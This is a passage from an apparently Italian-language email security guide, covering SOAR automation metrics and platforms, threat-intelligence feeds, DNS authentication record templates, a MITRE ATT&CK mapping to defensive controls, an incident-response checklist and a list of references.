    Write-Output "  - Messaggi purged: $($purgeAction.Results.Count)"
    Write-Output "  - Sender bloccato: ${SenderAddress}"
    Write-Output "  - URL bloccati: $($MaliciousUrls.Count)"
    Write-Output "  - Messaggi correlati trovati: $($correlatedMessages.Count)"
}
```

### 18.4 Metriche SOAR per Email Security

| Metrica | Senza SOAR | Con SOAR | Miglioramento |
|---------|-----------|---------|--------------|
| MTTD (Mean Time to Detect) | 15-60 min | 1-3 min | 90%+ |
| MTTR (Mean Time to Respond) | 30-120 min | 2-5 min | 95%+ |
| Capacità triage giornaliera | 20-40 incidenti/analista | 200-500 incidenti/analista | 10x |
| False positive escalation rate | 30-50% | 5-10% | 75%+ |
| Coverage (ore operative) | 8-16h (turni SOC) | 24/7 automatizzato | Continuo |
| Costo per incidente | €50-200 | €5-15 | 85%+ |

### 18.5 Piattaforme SOAR per Email Security

| Piattaforma | Integrazione Email | Punti di Forza |
|-------------|-------------------|----------------|
| Microsoft Sentinel + Logic Apps | Nativa M365 | Zero costo aggiuntivo per tenant M365 E5 |
| Splunk SOAR (Phantom) | Plugin Exchange/M365/Google | Libreria playbook pre-costruiti, community |
| Palo Alto XSOAR (Cortex) | Pack dedicati email | Marketplace playbook, ML integrato |
| Tines | API-based, M365/Google/SEG | No-code automation, pricing by actions |
| Swimlane | Plugin Exchange/SEG | Low-code, focus su metriche SOC |
| TheHive + Cortex | API-based, open source | Gratuito, analizzatori IOC integrati, MISP |

### 18.6 Integrazione con Threat Intelligence

L'automazione SOAR è massimamente efficace quando integrata con feed di threat intelligence che aggiornano automaticamente le regole di detection:

**Feed automatici:**
- **STIX/TAXII:** Standard per lo scambio strutturato di threat intelligence. I feed TAXII vengono consumati automaticamente dal SOAR per aggiornare IOC list
- **MISP:** Malware Information Sharing Platform per condivisione collaborativa di IOC. Le community MISP (settoriali, nazionali, internazionali) forniscono indicatori rilevanti
- **AbuseCH URLhaus/MalwareBazaar:** Feed gratuiti di URL e hash malevoli, aggiornati in tempo reale
- **PhishTank/OpenPhish:** Database collaborativi di URL di phishing verificati

**Workflow di aggiornamento:**

```
Feed Threat Intel → SOAR Ingest → Validazione automatica →
Aggiornamento blocklist email gateway → Scan retroattivo mailbox →
Remediation automatica messaggi corrispondenti
```

Questo ciclo consente di reagire a nuove minacce entro minuti dalla pubblicazione dell'IOC, invece di attendere l'aggiornamento manuale delle regole del gateway.

---

## Appendice — Quick Reference

### DNS Record Templates

```dns
; === COMPLETE EMAIL SECURITY DNS RECORDS ===

; SPF — list all authorized senders
example.com.  IN  TXT  "v=spf1 include:spf.protection.outlook.com ip4:203.0.113.0/24 -all"

; DKIM — one per selector (rotate quarterly)
selector1._domainkey.example.com.  IN  TXT  "v=DKIM1; k=rsa; p=<base64-public-key>"

; DMARC — enforcement with reporting
_dmarc.example.com.  IN  TXT  "v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s; rua=mailto:dmarc@example.com; fo=1; pct=100"

; MTA-STS — enforce TLS for inbound
_mta-sts.example.com.  IN  TXT  "v=STSv1; id=20260507001"

; TLSRPT — TLS failure reporting
_smtp._tls.example.com.  IN  TXT  "v=TLSRPTv1; rua=mailto:tls-report@example.com"

; BIMI — brand logo display (requires DMARC enforcement)
default._bimi.example.com.  IN  TXT  "v=BIMI1; l=https://example.com/logo.svg; a=https://example.com/vmc.pem"

; Null SPF for non-mail subdomains (prevent subdomain spoofing)
*.example.com.  IN  TXT  "v=spf1 -all"
*._domainkey.example.com.  IN  TXT  "v=DKIM1; p="
_dmarc.*.example.com.  IN  TXT  "v=DMARC1; p=reject; sp=reject"
```

### MITRE ATT&CK Mapping

| Technique | ID | Email Security Control |
|-----------|----|-----------------------|
| Phishing: Spearphishing Attachment | T1566.001 | Safe Attachments, ClamAV, Sandboxing |
| Phishing: Spearphishing Link | T1566.002 | Safe Links, URL rewriting, reputation |
| Phishing: Spearphishing via Service | T1566.003 | DLP, OAuth app controls |
| Valid Accounts: Cloud Accounts | T1078.004 | Conditional Access, MFA |
| Email Collection: Email Forwarding Rule | T1114.003 | Forwarding rule monitoring |
| Impersonation | T1656 | Anti-impersonation policies, DMARC |
| Compromise Accounts: Email Accounts | T1586.002 | Impossible travel, audit logging |

### Incident Response Checklist — Email Compromise

```
[ ] Contain: Disable compromised account / reset credentials
[ ] Contain: Revoke active sessions and OAuth tokens
[ ] Contain: Remove attacker-created inbox rules
[ ] Contain: Block attacker IP addresses at perimeter
[ ] Scope: Search for similar messages to other recipients
[ ] Scope: Check if attacker sent emails from compromised account
[ ] Scope: Review mailbox audit logs for data access
[ ] Eradicate: Purge phishing messages from all mailboxes
[ ] Eradicate: Block sender domain/IP in email gateway
[ ] Eradicate: Report phishing infrastructure for takedown
[ ] Recover: Re-enable account with new credentials + MFA
[ ] Recover: Notify affected users
[ ] Lessons: Update detection rules based on bypass method
[ ] Lessons: Document IOCs in threat intelligence platform
```

---

## Riferimenti e Standard

- RFC 5321 — Simple Mail Transfer Protocol (SMTP)
- RFC 7208 — Sender Policy Framework (SPF)
- RFC 6376 — DomainKeys Identified Mail (DKIM)
- RFC 8463 — DKIM Ed25519 Signing (nuove curve crittografiche)
- RFC 7489 — Domain-based Message Authentication (DMARC)
- RFC 9990 — DMARC v2 (schema aggiornato report aggregate)
- RFC 8617 — Authenticated Received Chain (ARC)
- RFC 8461 — SMTP MTA Strict Transport Security (MTA-STS)
- RFC 7672 — SMTP Security via Opportunistic DANE TLS
- RFC 8314 — Cleartext Considered Obsolete (implicit TLS)
- RFC 8551 — S/MIME 4.0 Message Specification
- RFC 4880 — OpenPGP Message Format
- RFC 6698 — DANE TLSA Record (DNS-Based Authentication of Named Entities)
- NIST SP 800-177 Rev 1 — Trustworthy Email
- NIST SP 800-63B — Digital Identity Guidelines (Authentication and Lifecycle Management)
- M3AAWG Best Practices for Email Authentication
- MITRE ATT&CK — Initial Access (T1566)
- MITRE ATT&CK — Email Collection (T1114)
- FBI IC3 — Business Email Compromise Reports (2024, 2025)
- FBI IC3 — Internet Crime Report 2025 (AI-Powered BEC, $893M losses)
- CIS Controls v8 — Control 9 (Email and Web Browser Protections)
- Gartner Market Guide for Email Security (2025) — ICES Category Definition
- IBM Cost of a Data Breach Report 2025 — $4.8M average phishing breach cost
- Verizon DBIR 2025 — Human Element in 60% of Breaches
- KnowBe4 Phishing Industry Benchmarking Report 2025
- EU AI Act — Requisiti governance AI per sistemi email security
- GDPR Art. 5(1)(e), Art. 9 — Data Minimization and Special Category Data
- PCI DSS v4.0 — Requisiti protezione dati carte di credito in email
- D.Lgs. 82/2005 (CAD) — Codice dell'Amministrazione Digitale (conservazione email Italia)
- Linee Guida AgID — Conservazione sostitutiva documenti informatici
- Microsoft Security Blog — DANE/DNSSEC for Exchange Online (2025-2026)
- Microsoft Learn — Defender for Office 365 Service Description
- parsedmarc documentation — Open-source DMARC report analyzer (v10.0)
